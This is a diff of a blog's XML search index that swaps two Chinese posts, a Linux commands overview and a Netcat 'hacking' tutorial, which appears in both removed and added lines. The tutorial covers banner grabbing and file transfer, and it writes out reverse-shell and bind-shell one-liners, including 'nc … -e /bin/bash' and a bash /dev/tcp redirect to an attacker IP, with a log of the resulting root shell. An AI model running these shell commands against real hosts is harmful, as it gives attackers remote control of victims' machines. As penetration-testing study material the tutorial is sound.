-    <content type="text"><![CDATA[1.用Netcat进行黑客攻击第1部分：基础知识Netcat是一个很好的网络实用程序，用于使用TCP和UPD协议读取和写入网络连接。Netcat通常被称为网络工具中的瑞士军刀，我们将在使用黑客教程的不同教程中大量使用它。Netcat最常见的用途是设置反向和绑定shell，管道和重定向网络流量，端口侦听，调试程序和脚本以及Banner抓取。在本教程中，我们将学习如何使用Netcat的基本功能，如： Banner抓取 原始连接 Web服务器交互 1.1 Netcat Banner获取使用以下命令来获取服务器Banner（与服务建立原始连接）： nc [ip address] [port] 我们来试试这个在21端口运行的Metasploitable 2上的FTP服务： nc 192.168.1.100 21 nc [ip] [port]用于与端口进行原始连接，当可用时将返回服务器Banner。 code: rocky@kail: nc 23.105.202.xx 21 # 21 ftp 控制链接 220 (vsFTPd 2.2.2) # 系统服务 banner 1.2 Netcat原连接为了演示原始连接的工作原理，我们将在FTP服务连接到目标主机后发出一些FTP命令。 在匿名的情况下，我们来看看这个FTP服务器是否允许匿名访问，通过USER和PASS命令。 12345code: rocky@kail: nc 23.105.202.xx 21 220 (vsFTPd 2.2.2) user Postgres 331 Please specify the password. 1.3 Web服务器交互Netcat还可以通过发出HTTP请求与Web服务器进行交互。 通过以下命令，我们可以抓住在Metasploitable 2上运行的Web服务的Banner： nc 23.105.202.xx 80 然后运行此HTTP请求： HEAD / HTTP / 1.0 rocky@kail: nc 23.105.202.xx 80 HEAD / HTTP / 1.0 &lt;&lt; 输入 HTTP/1.1 400 Bad Request Server: nginx/1.12.0 Date: Sun, 28 May 2017 08:06:19 GMT Content-Type: text/html Content-Length: 173 Connection: close 1.4 使用Netcat进行文件传输 在这个例子中，我们将使用Netcat连接传输一个文本文件。假设我们在目标主机上执行远程命令，我们希望将文件从攻击主机传输到目标主机。首先，我们需要在目标主机上设置一个侦听器，并从攻击主机连接到它。我们将使用端口8080用于此目的，我们将该文件安全保存到桌面: 1nc -lvp 8080&gt; 1.txt 在攻击主机上，我们连接到8080端口并发送文件名称transfer.txt： 1nc 192.168.100.107 8080 &lt; 1.txt 2 用Netcat进行黑客攻击第2部分：绑定和反向shellNetcat反向reverse shell 在渗透测试中，最常见，或者最受欢迎的用法是反向 reverse shell和正向bind shell。反向shell是从目标主机发起到处于监听状态的攻击机器的shell连接方式，又叫被动连接，而正向bind shell是攻击主机通过特定的端口进行侦听目标主机即将到来的连接。在恶意软件中，bind shell又通常被称为后门。 在下面的内容中我们将展示使用bind shell和reverse shell。下面将使用4444端口，但请注意，这可以是任何开放端口。实际上，通常您需要使用更常见的端口，如80和443来设置反向shell，因为这些端口是更常见的打开。 NC reverse shell 工作原理: 12攻击主机A执行: nc -lvp 4444 ; 监听被攻击者链接 12被攻击主机B执行: nc xxx.xxx.xxx.xxx 4444 -e /bin/bash ; 将bash shell 权限提供给攻击者 实现控制权限的转移; 实现通信后: 在攻击主机A上执行命令，即可操作被攻击者B 缺点: 此时被攻击者B 需要使用Netcat命令， 而且普通 GNU Linux nc 并没有 -e { -e filename program to exec after connect [dangerous]} 参数; 顾此种反向链接并不适用; 2.1 使用Bash 来代替Nc实现反向链接;12被攻击主机B: bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1 12攻击者A: nc -lvp 4444 1234567891011A机代码:[root@virtualS ~]# nc -lvp 4444Connection from 111.15.33.114:17835 ## 此时B机执行转移指令 bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1root@kailvirtual:~#root@kailvirtual:~#root@kailvirtual:~#root@kailvirtual:~#root@kailvirtual:~# ididuid=0(root) gid=0(root) groups=0(root)root@kailvirtual:~# 1234567891011 bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1 命令解释: bash: -i if the -i option is present, the shell is interactive shell: 0/1/2 分别代表Linux标准输入，输出，异常 即 C编程中的 stdin, stdout, stderr 0&gt;&amp;1 指 将标准输入完全输出到标准输出中; 采用&amp;可以将 0/1 绑定在一起。这条命令的作用标准输入将和标准输出同用一个文件描述符，说人话就是错误输入将会和标准输出输出到同一个地方。 2.2 Netcat正向bind Shellbind shell是一个绑定到目标主机上的特定端口以监听即将到来的连接的shell。我们来看看一个Netcat正向bind shell的原理: 123456789攻击主机A: rocky@mac: nc 192.168.1.9 4444 id uid=0(root) gid=0(root) groups=0(root) echo $HOSTNAME kailvirtual 相同点: 我们都需要被攻击者将其shell控制权限交给我们 将shell command 以数据流的形式重定向到被攻击主机的Bash shell中; 更多Nc 学习参照链接]]></content>
+    <title><![CDATA[Linux 常用命令]]></title>
+    <url>%2F2017%2F07%2F09%2Fcommands%2FLinux_command%2F</url>
+    <content type="text"><![CDATA[本文将常用的Linux 命令按照功能划分从以下八个方面讲解: 1. 文件管理 2. 文件传输 3. 文档编辑 4. 磁盘管理 5. 磁盘维护 6. 网络通讯 7. 系统管理 8. 系统设置 1. 文件管理 cat用法：cat [选项]… [文件]… 将[文件]或标准输入组合输出到标准输出。 tail tailftail : 默认将文件的末尾10行输出到标准输出中;tailf: 只显示新追加到文件的内容 等价于: tail -f cp用法：cp [选项]… [-T] 源文件 目标文件 或：cp [选项]… 源文件… 目录 或：cp [选项]… -t 目录 源文件…拷贝源文件 到目标地址， 可以选择多个源文件 mv用法：mv [选项]… [-T] 源文件 目标文件 或：mv [选项]… 源文件… 目录 或：mv [选项]… -t 目录 源文件…重命名源文件名为目标文件名, 或者是移动源文件到指定目录 rm用法：rm [选项]… 文件…移除 删除 文件; od用法：od [选项]… [文件]… 或：od [-abcdfilosx]… [文件] [[+]偏移量[.][b]] 或：od –traditional [选项]… [文件] [[+]偏移量[.][b] [+][标签][.][b]] 将指定文件以八进制形式(默认)转储到标准输出。如果指定了多于一个的文件参数，程序会自动将输入的内容整合为列表并以同样的形式输出。如果没有指定文件，或指定文件为”-“，程序从标准输入读取数据。 patchpatch 命令读取如何更改文件 的源文件指示信息，然后应用这些更改。源文件包含由 diff -c 或 -u 命令产生的差别列表（或者 diff 列表），以及一个或多个 diff 命令输出集（通常称为 hunks）。patch 结合差异的文件， 进行补全; diff 配合 patch: diff -ruN test1 test2 &gt; patch.log # 生成patch文件 patch test2 patch.log # 利用patch文件和patch命令打补丁 mkdir 用法：mkdir [选项]… 目录… 创建一个空的目录 rmdir用法：rm [选项]… 文件…删除一个空目录 chmod用法：chmod [选项]… 模式[,模式]… 文件… 或：chmod [选项]… 八进制模式 文件… 或：chmod [选项]… –reference=参考文件 文件…更改文件的属性: r w x chown 用法：chown [选项]… [所有者][:[组]] 文件… 或：chown [选项]… –reference=参考文件 文件… 更改文件的所属用户和所属组; whichUsage: /usr/bin/which [options] [–] COMMAND […]将命令的路径输出命令行界面; fileUsage: file [OPTION…] [FILE…]探测给定文件的类型 2. 文件传输 ftp scp rz/sz (串口) 3. 文档编辑 grep sort tr wc split sed awk 4. 磁盘管理 ls cd df du pwd tar tree find 5. 磁盘维护 dd fdisk mkfd mkswap sync 6. 网络通讯 ifconfig ip nc mesg ping netstat [ss] telnet traceroute route 7. 系统管理 date free kill ps last w whoami nice reboot shutdown su sudo top[htop] 8. 系统设置 alias [unlimit] set [unset] chkconfig service crontab at export passwd ulimit 参照: Linux Tools Quick Tutorial]]></content>
+      <categories>
+        <category>命令</category>
+      </categories>
       <tags>
         <tag>Linux</tag>
-        <tag>渗透</tag>
-        <tag>Kali</tag>
+        <tag>Commands</tag>
       </tags>
   </entry>
   <entry>
@@ -1196,15 +1221,13 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Linux 常用命令]]></title>
-    <url>%2F2017%2F07%2F09%2Fcommands%2FLinux_command%2F</url>
-    <content type="text"><![CDATA[本文将常用的Linux 命令按照功能划分从以下八个方面讲解: 1. 文件管理 2. 文件传输 3. 文档编辑 4. 磁盘管理 5. 磁盘维护 6. 网络通讯 7. 系统管理 8. 系统设置 1. 文件管理 cat用法：cat [选项]… [文件]… 将[文件]或标准输入组合输出到标准输出。 tail tailftail : 默认将文件的末尾10行输出到标准输出中;tailf: 只显示新追加到文件的内容 等价于: tail -f cp用法：cp [选项]… [-T] 源文件 目标文件 或：cp [选项]… 源文件… 目录 或：cp [选项]… -t 目录 源文件…拷贝源文件 到目标地址， 可以选择多个源文件 mv用法：mv [选项]… [-T] 源文件 目标文件 或：mv [选项]… 源文件… 目录 或：mv [选项]… -t 目录 源文件…重命名源文件名为目标文件名, 或者是移动源文件到指定目录 rm用法：rm [选项]… 文件…移除 删除 文件; od用法：od [选项]… [文件]… 或：od [-abcdfilosx]… [文件] [[+]偏移量[.][b]] 或：od –traditional [选项]… [文件] [[+]偏移量[.][b] [+][标签][.][b]] 将指定文件以八进制形式(默认)转储到标准输出。如果指定了多于一个的文件参数，程序会自动将输入的内容整合为列表并以同样的形式输出。如果没有指定文件，或指定文件为”-“，程序从标准输入读取数据。 patchpatch 命令读取如何更改文件 的源文件指示信息，然后应用这些更改。源文件包含由 diff -c 或 -u 命令产生的差别列表（或者 diff 列表），以及一个或多个 diff 命令输出集（通常称为 hunks）。patch 结合差异的文件， 进行补全; diff 配合 patch: diff -ruN test1 test2 &gt; patch.log # 生成patch文件 patch test2 patch.log # 利用patch文件和patch命令打补丁 mkdir 用法：mkdir [选项]… 目录… 创建一个空的目录 rmdir用法：rm [选项]… 文件…删除一个空目录 chmod用法：chmod [选项]… 模式[,模式]… 文件… 或：chmod [选项]… 八进制模式 文件… 或：chmod [选项]… –reference=参考文件 文件…更改文件的属性: r w x chown 用法：chown [选项]… [所有者][:[组]] 文件… 或：chown [选项]… –reference=参考文件 文件… 更改文件的所属用户和所属组; whichUsage: /usr/bin/which [options] [–] COMMAND […]将命令的路径输出命令行界面; fileUsage: file [OPTION…] [FILE…]探测给定文件的类型 2. 文件传输 ftp scp rz/sz (串口) 3. 文档编辑 grep sort tr wc split sed awk 4. 磁盘管理 ls cd df du pwd tar tree find 5. 磁盘维护 dd fdisk mkfd mkswap sync 6. 网络通讯 ifconfig ip nc mesg ping netstat [ss] telnet traceroute route 7. 系统管理 date free kill ps last w whoami nice reboot shutdown su sudo top[htop] 8. 系统设置 alias [unlimit] set [unset] chkconfig service crontab at export passwd ulimit 参照: Linux Tools Quick Tutorial]]></content>
-      <categories>
-        <category>命令</category>
-      </categories>
+    <title><![CDATA[Netcat 网络攻击 以及 应用]]></title>
+    <url>%2F2017%2F07%2F09%2Fkali%2FNetCat%E5%AD%A6%E4%B9%A0%E4%BB%8B%E7%BB%8D%2F</url>
+    <content type="text"><![CDATA[1.用Netcat进行黑客攻击第1部分：基础知识Netcat是一个很好的网络实用程序，用于使用TCP和UPD协议读取和写入网络连接。Netcat通常被称为网络工具中的瑞士军刀，我们将在使用黑客教程的不同教程中大量使用它。Netcat最常见的用途是设置反向和绑定shell，管道和重定向网络流量，端口侦听，调试程序和脚本以及Banner抓取。在本教程中，我们将学习如何使用Netcat的基本功能，如： Banner抓取 原始连接 Web服务器交互 1.1 Netcat Banner获取使用以下命令来获取服务器Banner（与服务建立原始连接）： nc [ip address] [port] 我们来试试这个在21端口运行的Metasploitable 2上的FTP服务： nc 192.168.1.100 21 nc [ip] [port]用于与端口进行原始连接，当可用时将返回服务器Banner。 code: rocky@kail: nc 23.105.202.xx 21 # 21 ftp 控制链接 220 (vsFTPd 2.2.2) # 系统服务 banner 1.2 Netcat原连接为了演示原始连接的工作原理，我们将在FTP服务连接到目标主机后发出一些FTP命令。 在匿名的情况下，我们来看看这个FTP服务器是否允许匿名访问，通过USER和PASS命令。 12345code: rocky@kail: nc 23.105.202.xx 21 220 (vsFTPd 2.2.2) user Postgres 331 Please specify the password. 1.3 Web服务器交互Netcat还可以通过发出HTTP请求与Web服务器进行交互。 通过以下命令，我们可以抓住在Metasploitable 2上运行的Web服务的Banner： nc 23.105.202.xx 80 然后运行此HTTP请求： HEAD / HTTP / 1.0 rocky@kail: nc 23.105.202.xx 80 HEAD / HTTP / 1.0 &lt;&lt; 输入 HTTP/1.1 400 Bad Request Server: nginx/1.12.0 Date: Sun, 28 May 2017 08:06:19 GMT Content-Type: text/html Content-Length: 173 Connection: close 1.4 使用Netcat进行文件传输 在这个例子中，我们将使用Netcat连接传输一个文本文件。假设我们在目标主机上执行远程命令，我们希望将文件从攻击主机传输到目标主机。首先，我们需要在目标主机上设置一个侦听器，并从攻击主机连接到它。我们将使用端口8080用于此目的，我们将该文件安全保存到桌面: 1nc -lvp 8080&gt; 1.txt 在攻击主机上，我们连接到8080端口并发送文件名称transfer.txt： 1nc 192.168.100.107 8080 &lt; 1.txt 2 用Netcat进行黑客攻击第2部分：绑定和反向shellNetcat反向reverse shell 在渗透测试中，最常见，或者最受欢迎的用法是反向 reverse shell和正向bind shell。反向shell是从目标主机发起到处于监听状态的攻击机器的shell连接方式，又叫被动连接，而正向bind shell是攻击主机通过特定的端口进行侦听目标主机即将到来的连接。在恶意软件中，bind shell又通常被称为后门。 在下面的内容中我们将展示使用bind shell和reverse shell。下面将使用4444端口，但请注意，这可以是任何开放端口。实际上，通常您需要使用更常见的端口，如80和443来设置反向shell，因为这些端口是更常见的打开。 NC reverse shell 工作原理: 12攻击主机A执行: nc -lvp 4444 ; 监听被攻击者链接 12被攻击主机B执行: nc xxx.xxx.xxx.xxx 4444 -e /bin/bash ; 将bash shell 权限提供给攻击者 实现控制权限的转移; 实现通信后: 在攻击主机A上执行命令，即可操作被攻击者B 缺点: 此时被攻击者B 需要使用Netcat命令， 而且普通 GNU Linux nc 并没有 -e { -e filename program to exec after connect [dangerous]} 参数; 顾此种反向链接并不适用; 2.1 使用Bash 来代替Nc实现反向链接;12被攻击主机B: bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1 12攻击者A: nc -lvp 4444 1234567891011A机代码:[root@virtualS ~]# nc -lvp 4444Connection from 111.15.33.114:17835 ## 此时B机执行转移指令 bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1root@kailvirtual:~#root@kailvirtual:~#root@kailvirtual:~#root@kailvirtual:~#root@kailvirtual:~# ididuid=0(root) gid=0(root) groups=0(root)root@kailvirtual:~# 1234567891011 bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1 命令解释: bash: -i if the -i option is present, the shell is interactive shell: 0/1/2 分别代表Linux标准输入，输出，异常 即 C编程中的 stdin, stdout, stderr 0&gt;&amp;1 指 将标准输入完全输出到标准输出中; 采用&amp;可以将 0/1 绑定在一起。这条命令的作用标准输入将和标准输出同用一个文件描述符，说人话就是错误输入将会和标准输出输出到同一个地方。 2.2 Netcat正向bind Shellbind shell是一个绑定到目标主机上的特定端口以监听即将到来的连接的shell。我们来看看一个Netcat正向bind shell的原理: 123456789攻击主机A: rocky@mac: nc 192.168.1.9 4444 id uid=0(root) gid=0(root) groups=0(root) echo $HOSTNAME kailvirtual 相同点: 我们都需要被攻击者将其shell控制权限交给我们 将shell command 以数据流的形式重定向到被攻击主机的Bash shell中; 更多Nc 学习参照链接]]></content>
       <tags>
         <tag>Linux</tag>
-        <tag>Commands</tag>
+        <tag>渗透</tag>
+        <tag>Kali</tag>
       </tags>
   </entry>
 </search>
